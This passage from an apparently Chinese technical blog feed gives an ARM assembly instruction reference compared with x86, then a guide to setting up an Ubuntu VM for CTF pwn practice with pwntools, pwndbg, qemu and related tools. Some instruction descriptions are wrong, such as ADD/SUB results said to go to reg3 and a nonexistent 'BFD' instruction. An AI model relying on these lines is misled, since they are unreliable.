src="https://img-blog.csdnimg.cn/b0fbdccab021435b88976c20d9c76418.png"></p><ul><li><code>APSR</code>：应用状态寄存器</li><li><code>EPSR</code>：执行状态寄存器</li><li><code>IPSR</code>：中断状态寄存器<br>上面的三个寄存器可以通过一个组合寄存器<code>PSR</code>访问，在不同的ARM架构中状态寄存器的排布有一定不同：<br><img src="https://img-blog.csdnimg.cn/e4f1e6c11a1a44b18d8e24f911b01891.png"></li></ul><p>3个中断-异常屏蔽寄存器的功能较少用到，这里先不进行讨论。<br><code>CONTROL</code>寄存器确定了栈指针的选择和线程模式的访问等级，其只能够在特权等级下才能进行修改。</p><p><img src="https://img-blog.csdnimg.cn/da1b9c3ff9db4e32b4c85814c71a79cd.png"><br>其中具体的细节阐述较为繁琐，不是本文的重点，略过。</p><p>另外，在x86-64架构和ARM架构中都有很多的浮点数寄存器，用于进行浮点数计算。在ARM架构中，浮点数寄存器有32个32位寄存器<code>S0~S31</code>，其中可以两两组合访问为<code>D0~D15</code>，如<code>S0</code>和<code>S1</code>组合为<code>D0</code>。</p><h1 id="2-指令集"><a href="#2-指令集" class="headerlink" title="2. 指令集"></a>2. 指令集</h1><p>ARM的指令集和x86-64有一些相似之处，但也有一些不同，需要注意的是，ARM的立即数前面需要加上#标识，如#0x12345678。下面的指令均为32位系统下的指令。</p><h2 id="A-寄存器传送数据"><a href="#A-寄存器传送数据" class="headerlink" title="A. 寄存器传送数据"></a>A. 寄存器传送数据</h2><p>与x86相同，ARM使用<code>MOV</code>系列指令进行寄存器与寄存器（立即数）之间的数据传送：</p><ul><li>**<code>MOV/MOVS reg1, &lt;reg2/imm8&gt;</code>**：赋值<code>reg1</code>为<code>reg2/imm8</code></li><li>**<code>MOVW &lt;reg32&gt;, &lt;imm16&gt;</code>**：赋值<code>reg32</code>的低16位为<code>imm16</code></li><li>**<code>MOVT &lt;reg32&gt;, &lt;imm16&gt;</code>**：赋值<code>reg32</code>的高16位为<code>imm16</code></li><li>**<code>MVN reg1, &lt;reg2&gt;</code>**：将<code>reg2</code>的值取反之后赋值给<code>reg1</code></li><li>**<code>LDR &lt;reg32&gt;, =&lt;imm32&gt;</code>**^①^：赋值<code>reg32</code>为<code>imm32</code></li></ul><p>备注：<br>① 这里的指令并不是一条真正的指令，而是一条伪指令。ARM汇编器会将字符数据汇总组成一个称为 <strong>“文字池”</strong> 的数据块，与x86-64不同，后者如果需要实现将立即数赋值到寄存器，会直接将立即数写死到指令中。这里的<code>LDR</code>指令实际是做了寻址操作，将文字池地址中的数据赋值到寄存器中。如果需要将32位立即数赋值到32位寄存器，可以使用这条指令，也可以将<code>MOVW</code>和<code>MOVT</code>指令配合使用分别赋值前16位和后16位。</p><h2 id="B-存储器传送数据"><a href="#B-存储器传送数据" class="headerlink" title="B. 存储器传送数据"></a>B. 存储器传送数据</h2><p>不同于x86使用mov指令可实现寄存器、立即数和内存空间的数据交换，ARM使用单独的指令集进行寄存器和内存空间的数据交换，其中基址可以选择任意一个通用寄存器或PC寄存器，变址也可以使用任意一个通用寄存器，较x86更加灵活：</p><ul><li>**<code>LDRB/LDRH/LDR reg1, [&lt;reg2/PC&gt;, &lt;imm32&gt;]&lt;!&gt;</code>**：赋值8&#x2F;16&#x2F;32位<code>reg2+imm32</code>地址的数据到<code>reg1</code>，如果指令后面有叹号，表示指令执行后<code>reg2</code>值更新为<code>reg2+imm32</code>，有叹号可等同于 <strong><code>LDRB/LDRH/LDR reg1, [&lt;reg2&gt;], &lt;imm32&gt;</code><strong>，这种形式称为</strong>后序指令</strong>。</li><li>**<code>LDRD reg1, &lt;reg2&gt;, [&lt;reg3/PC&gt;, &lt;imm32&gt;]&lt;!&gt;</code>**：赋值64位<code>reg3+imm32</code>地址的数据到<code>reg1</code>和<code>reg2</code>，有叹号可等同于 <strong><code>LDRD reg1, &lt;reg2&gt;, [reg3], &lt;imm32&gt;</code></strong></li><li>**<code>LDRSB/LDRSH reg1, [&lt;reg2/PC&gt;, &lt;imm32&gt;]&lt;!&gt;</code>**：有符号传送8&#x2F;16位<code>reg2+imm32</code>地址的数据到<code>reg1</code>，目标寄存器会进行32位有符号扩展，有叹号可等同于 <strong><code>LDRSB/LDRSH reg1, [&lt;reg2&gt;], &lt;imm32&gt;</code></strong></li><li>**<code>STRB/STRH/STR reg1, [&lt;reg2&gt;, &lt;imm32&gt;]&lt;!&gt;</code>**：保存寄存器<code>reg1</code>的8&#x2F;16&#x2F;32位值到<code>reg2+imm32</code>地址，有叹号可等同于 <strong><code>STRB/STRH/STR reg1, [&lt;reg2&gt;], &lt;imm32&gt;</code></strong></li><li>**<code>STRD reg1, &lt;reg2&gt;, [reg3, &lt;imm32&gt;]&lt;!&gt;</code>**：保存寄存器<code>reg1</code>和<code>reg2</code>的64位值值到<code>reg3+imm32</code>地址，有叹号可等同于 <strong><code>STRD reg1, &lt;reg2&gt;, [reg3], &lt;imm32&gt;</code></strong></li><li>**<code>LDRB/LDRH/LDR reg1, [&lt;reg2/PC&gt;, reg3&#123;, LSL &lt;imm&gt;&#125;]</code>**：赋值寄存器<code>reg1</code>的值为<code>reg2/PC+(reg3&#123;&lt;&lt;imm&#125;)</code>地址处的8&#x2F;16&#x2F;32位值</li><li>**<code>LDRD reg1, &lt;reg2&gt;, [&lt;reg3/PC&gt;, &lt;reg4-32&gt;&#123;, LSL &lt;imm&gt;&#125;]</code>**：赋值寄存器<code>reg1</code>和<code>reg2</code>的值为<code>reg3/PC+(reg4-32&#123;&lt;&lt;imm&#125;)</code>地址处的64位值</li><li>**<code>STRB/STRH/STR reg1, [&lt;reg2&gt;, reg3&#123;, LSL &lt;imm&gt;&#125;]</code>**：保存寄存器<code>reg1</code>的8&#x2F;16&#x2F;32位值到<code>reg2+(reg3&#123;&lt;&lt;imm&#125;)</code>地址</li><li>**<code>LDMIA/LDMDB reg1&lt;!&gt;, &lt;reg-list&gt;</code>**：将<code>reg1</code>地址的值按照顺序保存到<code>reg-list</code>中的寄存器中，如果<code>reg1</code>后有叹号，则在保存值后自动增加（<code>LDMIA</code>）或减少（<code>LDMDB</code>）<code>reg1</code>。如<code>LDMIA R0, &#123;R1-R5&#125;</code>，<code>LDMIA R0, &#123;R1, R3, R6-R9&#125;</code></li><li>**<code>STMIA/STMDB reg1&lt;!&gt;, &lt;reg-list&gt;</code>**：向<code>reg1</code>地址存入寄存器组中的多个字。如果<code>reg1</code>后有叹号，则在保存值后自动增加（<code>STMIA</code>）或减少（<code>STMDB</code>）<code>reg1</code>。</li></ul><p>注意：后序指令不能使用PC寻址。</p><h2 id="C-入栈出栈"><a href="#C-入栈出栈" class="headerlink" title="C. 入栈出栈"></a>C. 入栈出栈</h2><p>虽然ARM与x86都使用push和pop指令进行入栈和出栈，但ARM可以实现一条指令多次出入栈。</p><ul><li>**<code>PUSH &lt;reg-list&gt;</code>**：将寄存器组中的寄存器值依次入栈，<code>reg-list</code>中可以有PC、LR寄存器。</li><li>**<code>POP &lt;reg-list&gt;</code>**：将出栈的值依次存入寄存器组中的寄存器，<code>reg-list</code>中可以有PC、LR寄存器。</li></ul><h2 id="D-算术运算"><a href="#D-算术运算" class="headerlink" title="D. 算术运算"></a>D. 算术运算</h2><p>不同于x86指令的大多数算术运算使用两个寄存器，ARM指令的算数运算指令通常包含3个寄存器，实现运算后的自由赋值而不是x86中必须赋值给目标寄存器且目标寄存器必须参与运算。</p><ul><li>**<code>ADD/SUB reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;</code>**：计算<code>&lt;reg2&gt;(+/-)&lt;reg3/imm32&gt;</code>将结果保存到<code>reg3</code></li><li>**<code>ADC/SBC reg1, &lt;reg2&gt;, reg3</code>**：计算<code>&lt;reg2&gt;(+/-)reg3+(进位/借位)</code>将结果保存到<code>reg3</code></li><li>**<code>ADC &lt;reg32&gt;, &lt;imm32&gt;</code>**：计算<code>reg32+imm32+进位</code>将结果保存到<code>reg32</code></li><li>**<code>SBC reg1, &lt;reg2&gt;, &lt;imm32&gt;</code>**：计算<code>&lt;reg2&gt;-imm32-借位</code>将结果保存到<code>reg1</code></li><li>**<code>RSB reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;</code>**：计算<code>&lt;reg3/imm&gt;-&lt;reg2&gt;</code>将结果保存到<code>reg1</code></li><li>**<code>MUL reg1, &lt;reg2&gt;, reg3</code>**：计算<code>&lt;reg2&gt;*reg3</code>将结果保存到<code>reg1</code></li><li>**<code>UDIV/SDIV reg1, &lt;reg2&gt;, reg3</code>**：计算<code>&lt;reg2&gt;/reg3</code>（无符号&#x2F;有符号）将结果保存到<code>reg1</code>，如果除以0，则结果为0</li><li>**<code>MLA reg1, &lt;reg2&gt;, reg3, &lt;reg4-32&gt;</code>**：计算<code>reg1=&lt;reg2&gt;*reg3+&lt;reg4-32&gt;</code></li><li>**<code>MLS reg1, &lt;reg2&gt;, reg3, &lt;reg4-32&gt;</code>**：计算<code>reg1=-&lt;reg2&gt;*reg3+&lt;reg4-32&gt;</code></li></ul><h2 id="E-逻辑运算"><a href="#E-逻辑运算" class="headerlink" title="E. 逻辑运算"></a>E. 逻辑运算</h2><p>ARM支持x86格式的逻辑运算以及3运算符的逻辑运算。</p><ul><li>**<code>AND/ORR/BIC/EOR reg1, &lt;reg2&gt;&#123;, &lt;reg3/imm32&gt;&#125;</code>**：如果<code>reg3/imm</code>存在，则表示<code>reg1=&lt;reg2&gt;(&amp;/|/&amp;~/^)&lt;reg3/imm32&gt;</code>，否则表示<code>reg1=reg1(&amp;/|/&amp;~/^)&lt;reg2&gt;</code>（与&#x2F;或&#x2F;与非&#x2F;异或）</li><li>**<code>ORN reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;</code>**：表示<code>reg1=&lt;reg2&gt;|~&lt;reg3/imm32&gt;</code>（或非）</li></ul><h2 id="F-移位运算"><a href="#F-移位运算" class="headerlink" title="F. 移位运算"></a>F. 移位运算</h2><ul><li>**<code>ASR/LSL/LSR reg1, &lt;reg2&gt;&#123;, &lt;reg3/imm32&gt;&#125;</code>**：如果<code>reg3/imm</code>存在，则表示<code>reg1=&lt;reg2&gt;(&gt;&gt;/&lt;&lt;)&lt;reg3/imm32&gt;</code>，否则表示<code>reg1=reg1(&gt;&gt;/&lt;&lt;)&lt;reg2&gt;</code>（算数右移、逻辑左移、逻辑右移）</li><li>**<code>ROR reg1, &lt;reg2&gt;&#123;, reg3&#125;</code>**：如果<code>reg3</code>存在，则表示<code>reg1=&lt;reg2&gt;(&gt;&gt;)reg3</code>，否则表示<code>reg1=reg1(&gt;&gt;)&lt;reg2&gt;</code>（循环右移）</li></ul><h2 id="G-符号扩展"><a href="#G-符号扩展" class="headerlink" title="G. 符号扩展"></a>G. 符号扩展</h2><p>对应于x86中的movsx和movzx指令。</p><ul><li>**<code>SXTB/SXTH reg1, &lt;reg2&gt;&#123;, ROR &lt;imm&gt;&#125;</code>**：右移<code>&lt;imm&gt;</code>位后有符号扩展<code>&lt;reg2&gt;</code>的低8&#x2F;16位并赋值给<code>reg1</code></li><li>**<code>UXTB/UXTH reg1, &lt;reg2&gt;&#123;, ROR &lt;imm&gt;&#125;</code>**：右移<code>&lt;imm&gt;</code>位后无符号扩展<code>&lt;reg2&gt;</code>的低8&#x2F;16位并赋值给<code>reg1</code></li></ul><h2 id="H-数据反转"><a href="#H-数据反转" class="headerlink" title="H. 数据反转"></a>H. 数据反转</h2><p>将寄存器中的值按字节进行反转。</p><ul><li>**<code>REV reg1, reg2</code>**：将<code>reg2</code>中的4字节数据按字节反转后赋值给<code>reg1</code>（<code>reg2</code>值不变），原先第0，1，2，3字节的内容被换到了第3，2，1，0字节。</li><li>**<code>REV16 reg1, reg2</code>**：将<code>reg2</code>中的4字节以字单位分为高字和低字分别进行反转后赋值给<code>reg1</code>（<code>reg2</code>值不变），原先第0，1，2，3字节的内容被换到了第1，0，3，2字节。</li><li>**<code>REVSH reg1, reg2</code>**：将<code>reg2</code>中的低2字节反转后有符号扩展赋值给<code>reg1</code></li><li>**<code>REVH reg1, reg2</code>**：<code>REV</code>指令的16位表示，只反转低2字节。</li></ul><h2 id="I-位域操作"><a href="#I-位域操作" class="headerlink" title="I. 位域操作"></a>I. 位域操作</h2><p>位域操作允许机器指令对寄存器中的特定位进行处理，在x86中好像是也有这样的指令，只是使用频率太低。</p><ul><li>**<code>BFD reg1, #lsb, #width</code>**：将<code>reg1</code>中从第<code>lsb</code>位开始的连续<code>width</code>位清零。</li><li>**<code>BFI reg1, reg2, #lsb, #width</code>**：将<code>reg2</code>中最低<code>width</code>位复制到<code>reg1</code>中从<code>lsb</code>位开始的连续<code>width</code>位。</li><li>**<code>CLZ reg1, reg2</code>**：计算<code>reg2</code>中高位0的个数并赋值给<code>reg1</code>，多用于浮点数计算。</li><li>**<code>RBIT reg1, reg2</code>**：反转<code>reg2</code>寄存器中的所有位并赋值给<code>reg1</code>。</li><li>**<code>SBFX/UBFX reg1, reg2, #lsb, #width</code>**：取<code>reg2</code>中从第<code>lsb</code>位开始的连续<code>width</code>位并有&#x2F;无符号扩展，赋值给<code>reg1</code>。</li></ul><h2 id="J-比较和测试指令"><a href="#J-比较和测试指令" class="headerlink" title="J. 比较和测试指令"></a>J. 比较和测试指令</h2><p>与x86使用<code>cmp</code>指令和<code>test</code>指令相似，ARM也有关于比较和测试的指令，且实现原理基本相同。</p><ul><li>**<code>CMP reg1, reg2/imm</code>**：比较两个寄存器或寄存器与立即数，更新标志位APSR。</li><li>**<code>CMN reg1, reg2/imm</code>**：比较<code>reg1</code>和<code>-reg2</code>或<code>-imm</code>，更新标志位APSR。</li><li>**<code>TST reg1, reg2/imm</code>**：参照x86的<code>test</code>指令，相与测试，更新N（负数位）和Z（零）标志</li><li>**<code>TEQ reg1, reg2/imm</code>**：异或测试，更新N和Z标志</li></ul><h2 id="K-跳转指令"><a href="#K-跳转指令" class="headerlink" title="K. 跳转指令"></a>K. 跳转指令</h2><ul><li>**<code>B/B.W &lt;label&gt;</code>**：无条件跳转到指定位置，<code>B.W</code>跳转范围更大。</li><li>**<code>BX reg</code>**：寄存器跳转。</li><li><strong><code>BL &lt;label&gt; / BLX reg</code><strong>：跳转到指定位置&#x2F;寄存器值，且将返回地址保存到<code>LR</code>寄存器中，类比x86的<code>call</code>指令。</strong>一般在函数开头都会首先将<code>BL</code>寄存器的值保存到栈中便于返回时获取。</strong></li><li>条件跳转指令族：类比x86指令：<ul><li><code>BEQ == je</code></li><li><code>BNE == jne</code></li><li><code>BCS/BHS == jc</code>（进位标志为1，可表示无符号大于等于）</li><li><code>BCC/BLO == jnc</code>（进位标志为0，可表示无符号小于）</li><li><code>BMI == js</code>（负数标志为1）</li><li><code>BPL == jns</code>（负数标志为0）</li><li><code>BVS == jo</code>（溢出标志为1）</li><li><code>BVC == jno</code>（溢出标志为0）</li><li><code>BHI == ja</code>（无符号大于）</li><li><code>BLS == jbe</code>（无符号小于等于）</li><li><code>BGE == jge</code>（有符号大于等于）</li><li><code>BLE == jle</code>（有符号小于等于）</li><li><code>BGT == jg</code>（有符号大于）</li><li><code>BLT == jl</code>（有符号小于）</li></ul></li><li>**<code>CBZ/CBNZ reg, &lt;label&gt;</code>**：比较寄存器的值为0&#x2F;不为0时跳转（只支持前向跳转）</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>从零开始搭建Ubuntu CTF-pwn环境</title>
      <link href="/2023/02/28/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BAUbuntu-CTF-pwn%E7%8E%AF%E5%A2%83/"/>
      <url>/2023/02/28/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BAUbuntu-CTF-pwn%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>最近因为学校考试所以没怎么看pwn，但是中间虚拟机崩掉过，问题还挺严重。前几天发现能正常打开了，但是一用gdb就会出现下面让人窒息的提醒：<br><img src="https://img-blog.csdnimg.cn/1118668a806b41028cc14e752435d8b3.png"><br>怎么调都不知道是怎么回事，很奇怪的是只有在开gdb的时候才会弹出这个错误，其他都是正常的。问过师傅时候无奈只能放弃这个与我并肩作战这么长时间的ubuntu 20.04，重装一个虚拟机。一不做二不休，干脆就将整个过程记录下来，便于日后查询。</p><h1 id="虚拟机日常维护注意事项"><a href="#虚拟机日常维护注意事项" class="headerlink" title="虚拟机日常维护注意事项"></a>虚拟机日常维护注意事项</h1><p>在最新的VMware中对虚拟机有一个<font color="00FF00"><strong>保护选项</strong></font>，可以在指定时间间隔内保存一个快照，这样在虚拟机崩溃的时候能够快速回档到前两天的快照中，有效减少文件等的损失，而不必每次都手动保存快照。（有读者可能会怀疑为什么我不能对崩掉的虚拟机回档，实际上我做了尝试，但是上面的问题还是存在，这就不是虚拟机状态的问题了，而是某些底层硬件配置的问题，可能是硬件出问题导致调试无法进行，但具体的我也不知道应该如何处理，因此只能重装）<br><img src="https://img-blog.csdnimg.cn/d444eaec57f84fcfb4b79e13ff2a5a3b.png"><br>如上图所示，在虚拟机设置-&gt;选项中可以找到自动保护选项，根据你设置的保护间隔和最大自动保护快照数量可以计算出至少需要的磁盘空间，因此需要<font color=red><strong>保证有足够的磁盘空间</strong></font>。</p><p>另外，当虚拟机<font color=blue><strong>存在快照</strong></font>时，是<font color=blue><strong>不能扩充磁盘容量</strong></font>的，因此要想扩充虚拟机的虚拟磁盘，要么<font color=red><strong>在创建虚拟机时就分配足够大小的磁盘空间</strong></font>，要么就只能<font color=red><strong>删除所有的快照</strong></font>后再进行扩充（建议前者，因为有的快照删除特别慢，如果快照多的话可能要等很长时间）</p><h1 id="从零搭建环境"><a href="#从零搭建环境" class="headerlink" title="从零搭建环境"></a>从零搭建环境</h1><p>下面就将介绍如何从零搭建一个CTF-pwn环境（由于学习仍在进行，故一些环境如远程执行环境还没有搭建的经历，如今后需要搭建，会在最后进行补充）</p><h2 id="1-创建虚拟机"><a href="#1-创建虚拟机" class="headerlink" title="1. 创建虚拟机"></a>1. 创建虚拟机</h2><p>可以在ubuntu官方网站上下载最新的长期支持版本，在笔者写这篇文章的时候，这个版本已经是22.04了，但还是按照20.04的版本来安装。<a href="https://cn.ubuntu.com/download/desktop">22.04下载</a>&#x2F;<a href="https://cn.ubuntu.com/download/alternative-downloads">历史版本下载</a></p><p><img src="https://img-blog.csdnimg.cn/fbc36cfdc2414f00a9b91ba913680866.png"><br>下载的是光盘映像文件，将其放在虚拟机的工作目录中。</p><p>然后选择vmware上方工具栏的文件-&gt;新建虚拟机，打开新建虚拟机向导。如下：<br><img src="https://img-blog.csdnimg.cn/a2b603c88beb4a01a2d03daf109f6bca.png"><br>选择自定义安装，点击下一步。</p><p><img src="https://img-blog.csdnimg.cn/05cef1de90f44e33948d9db9ed60ce49.png"><br>硬件兼容性不需要改，一般默认选择最新的vmware版本兼容，你的vmware是什么版本就用什么版本，不用修改，直接点击下一步。</p><p><img src="https://img-blog.csdnimg.cn/f20d9df8ab8b4a3a8d643e03acf74409.png"><br>选择安装程序光盘映像文件，点击浏览，选择你刚才下载的映像文件，然后点击下一步。</p><p><img src="https://img-blog.csdnimg.cn/ed013bbc66f14150b85bf2f31b404d67.png"><br>输入全名（这个随便输，想输什么都行），以及你登录虚拟机的用户名和密码。之后点击下一步。</p><p><img src="https://img-blog.csdnimg.cn/ec085415468345b3902738076ee21701.png"><br>输入虚拟机的名字，将位置浏览设置为你的虚拟机工作目录。</p><p><img src="https://img-blog.csdnimg.cn/6e10263a29424dc8a6dd82c4828a2fac.png"><br>处理器数量选择。如果你的电脑配置很好而且虚拟机也需要一定的计算需要，可以设置多一些，内核数量不变，修改处理器数量。但是总数不能超过你电脑主机的内核数量。我一般选择8处理器。</p><p><img src="https://img-blog.csdnimg.cn/bcd9df7260474273ba3396432d0f7c12.png"><br>内存大小设置。同样看主机的配置。最好不要超过主机的内存大小，否则虚拟机可能会变慢。对于pwn做题来说4GB一般就足够了。</p><p><img src="https://img-blog.csdnimg.cn/089f64591a3f44b4b89500994bc8cfbc.png"><br>网络选择。这个网络的选择可以在虚拟机创建之后随时修改，这里简单介绍一下最常用的前两种：<strong>桥接网络和NAT</strong>。桥接网络如上面所说，直接访问外部以太网，前提是虚拟机要有自己的IP地址，因此桥接网络在使用的时候大多都是勾选“与主机共用IP地址”这个选项（这个选项在创建虚拟机到这一步的时候没有显示，但是可以在上方工具栏<strong>虚拟机-&gt;设置</strong>中找到并勾选，后面再说）。某些学校的校园网可能有接入设备数量限制（笔者学校就是），这个时候虚拟机选择桥接网络可能无法联网，可以考虑使用NAT模式，在这个模式下，主机相当于一个网关，而虚拟机为网关下的机器，与外部以太网连接需要借助主机。这种模式可以有效克服上面说的校园网接入数量限制问题。<br>因此这里选择默认NAT，<strong>最好能够保证开机之后立刻联网</strong>呃，因为需要下载一些包，安装完成之后也能改。以默认NAT进行下一步。</p><p><img src="https://img-blog.csdnimg.cn/36d4869449b84b94aa7fa2f406eb89a4.png"><br>IO控制器类型，不用改直接下一步。</p><p><img src="https://img-blog.csdnimg.cn/f9be0b0f51be4b2caa1999af5c1e23d0.png"><br>磁盘类型也不用改，直接下一步。</p><p><img src="https://img-blog.csdnimg.cn/63db1daec903499a9a9fc6a732cd22cf.png"><br>磁盘类型不用改，下一步。</p><p><img src="https://img-blog.csdnimg.cn/829ad28e615a47078c51ee00902065c0.png"><br>磁盘空间设置这里，除了最大磁盘大小之外其他都不要改。为了避免出现磁盘空间不足的问题，笔者这里设置为200GB。这个大小根据自己的物理磁盘空间决定，但是不要太小，<strong>建议pwner们不要小于60GB</strong>，后面做kernel pwn搭建环境可能很占空间的。</p><p><img src="https://img-blog.csdnimg.cn/dc5e00ac7bee40999ce223c0800a783b.png"><br>磁盘文件，不用改直接下一步。</p><p><img src="https://img-blog.csdnimg.cn/0adc1d23dbc444cb9a227d560637cce3.png"><br>上面是最后确认的界面，确定好虚拟机的配置后，点击完成就可以开始创建虚拟机了。</p><p><img src="https://img-blog.csdnimg.cn/0b22f4d4bfbb424996917c500c5e425d.png"><br>之后是自动开机安装过程，耐心等待一段时间……</p><p><img src="https://img-blog.csdnimg.cn/24d1b1c99b45470eb055da0258e3754f.png"><br>大约10分钟之后，我们就能够登录ubuntu系统了。</p><p><img src="https://img-blog.csdnimg.cn/e6147fd6490848d3b412eafc799b43d8.png"><br>在笔者的vmware中，linux系统在安装的时候就已经安装了VMware Tools，它能够帮助你更加快捷地在主机和虚拟机中传递文件，只需拖动即可。但是笔者的虚拟机只能从打开的文件夹中拖动文件到主机，不能从桌面上直接拖动复制，从主机复制文件到虚拟机也是必须复制到打开的文件夹中。</p><p>自此，我们的ubuntu系统就成功搭建好了，下面进行一些配置使虚拟机能够更加轻松方便地使用。</p><h2 id="2-默认root权限设置"><a href="#2-默认root权限设置" class="headerlink" title="2. 默认root权限设置"></a>2. 默认root权限设置</h2><p>在做题的时候，如果我们能够直接以root的身份登录，就不需要输入n多次的密码了。</p><p>参考<a href="https://blog.csdn.net/willhu2008/article/details/121699938?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165499613116782184643247%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165499613116782184643247&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-121699938-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&utm_term=ubuntu20.04%E9%BB%98%E8%AE%A4root%E7%99%BB%E5%BD%95&spm=1018.2226.3001.4187">资料</a>进行操作即可。根据步骤来，实测有效。</p><p><img src="https://img-blog.csdnimg.cn/c8c04eda32054cc1a0b4c703d6a16c8d.png"><br>注意正上方的提示，重启之后我们已经成功自动以root用户登录了，完成。</p><h2 id="3-安装vim"><a href="#3-安装vim" class="headerlink" title="3. 安装vim"></a>3. 安装vim</h2><p><code>apt install vim</code>即可</p><h2 id="4-修改软件源"><a href="#4-修改软件源" class="headerlink" title="4. 修改软件源"></a>4. 修改软件源</h2><p>ubuntu自带的软件源是国外的，速度慢有的时候还连不上，于是应修改为国内的镜像。</p><p><a href="https://blog.csdn.net/m0_37317193/article/details/121310922?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165499699616780366572573%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165499699616780366572573&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121310922-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&utm_term=ubuntu20.04%E9%95%9C%E5%83%8F%E6%BA%90%E9%98%BF%E9%87%8C%E4%BA%91&spm=1018.2226.3001.4187">镜像与修改方法</a></p><p>笔者选择阿里云镜像。</p><p>修改完文件之后记得<code>apt update</code>和<code>apt upgrade</code>进行更新。第一次更新可能需要等一段时间，看你的网速怎么样……</p><h2 id="5-安装sublime-text（非必要）"><a href="#5-安装sublime-text（非必要）" class="headerlink" title="5. 安装sublime-text（非必要）"></a>5. 安装sublime-text（非必要）</h2><p>使用系统自带的gedit没有补全功能，可以在ubuntu应用商店里面搜索sublime-text安装，打开py文件的时候右键选中“Open with other application”就可以使用sublime-text打开了。（这里图标显示不出来，但是安装没有问题）</p><p><img src="https://img-blog.csdnimg.cn/f2016d8b64ef4c6bb096c51ed28912e2.png"></p><h2 id="6-安装pwntools"><a href="#6-安装pwntools" class="headerlink" title="6. 安装pwntools"></a>6. 安装pwntools</h2><p>pwntools是pwn最常用的一个python包。<br>首先需要安装pip：<code>apt install python3-pip</code><br>然后安装pwntools：<code>pip install pwntools</code><br>完成。</p><h2 id="7-安装pwndbg"><a href="#7-安装pwndbg" class="headerlink" title="7. 安装pwndbg"></a>7. 安装pwndbg</h2><p>pwndbg是gdb的插件，帮助我们在做题时进行调试。<br>首先安装git：<code>apt install git</code><br>然后拉取git库：<code>git clone https://github.com/pwndbg/pwndbg</code><br>进入pwndbg目录运行bash脚本<code>setup.sh</code>即开始安装</p><p><img src="https://img-blog.csdnimg.cn/cb873d25bd134315bbaebca8d40fcf34.png"><br>运行gdb下有pwndbg标识即表示安装成功。</p><h2 id="8-安装LibcSearcher"><a href="#8-安装LibcSearcher" class="headerlink" title="8. 安装LibcSearcher"></a>8. 安装LibcSearcher</h2><p>请参考<a href="https://blog.csdn.net/qq_40026795/article/details/107150265?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165501579816780357270501%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165501579816780357270501&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107150265-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&utm_term=libcsearcher%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">资料</a></p><p>注意不要使用<del>pip install LibcSearcher</del>，这两个是不一样的，链接中的是国人写的，准确度相对高一些。</p><h2 id="9-安装checksec"><a href="#9-安装checksec" class="headerlink" title="9. 安装checksec"></a>9. 安装checksec</h2><p>请参考<a href="https://blog.csdn.net/qq_43430261/article/details/105516051?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165501780216782248583442%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165501780216782248583442&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-105516051-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&utm_term=checksec%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">资料</a></p><p><strong>到这一步完成之后，一般的pwn题就可以开始做了。如果需要kernel环境，则继续下面的步骤。</strong></p><h2 id="10-安装qemu"><a href="#10-安装qemu" class="headerlink" title="10. 安装qemu"></a>10. 安装qemu</h2><p>使用<code>apt list qemu*</code>可查看所有前缀为qemu的包。可以看到这里有很多支持不同架构的qemu。<br><img src="https://img-blog.csdnimg.cn/13fca94a56444dda939c9563a457da77.png"><br>根据自己的需要安装对应架构的包即可。一般最为常用的是x86架构：<code>apt install qemu-system-x86</code>，注意不能只输入<code>apt install qemu</code>。</p><h2 id="11-配置kernel-pwn环境"><a href="#11-配置kernel-pwn环境" class="headerlink" title="11. 配置kernel pwn环境"></a>11. 配置kernel pwn环境</h2><p>较为复杂，这里给出笔者以前写的资料。<br><a href="https://blog.csdn.net/qq_54218833/article/details/124360103">资料</a></p><h2 id="12-安装vmlinux-to-elf"><a href="#12-安装vmlinux-to-elf" class="headerlink" title="12. 安装vmlinux-to-elf"></a>12. 安装vmlinux-to-elf</h2><p>这是一个用于将bzImage解压为vmlinux的工具，在kernel pwn中经常用到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/marin-m/vmlinux-to-elf</span><br><span class="line"><span class="built_in">cd</span> vmlinux-to-elf</span><br><span class="line">sudo python3 ./setup.py install</span><br></pre></td></tr></table></figure><p>然后就可以使用vmlinux-to-elf命令进行解压了。</p><h2 id="13-ARM-pwn环境搭建"><a href="#13-ARM-pwn环境搭建" class="headerlink" title="13. ARM pwn环境搭建"></a>13. ARM pwn环境搭建</h2><p>参考<a 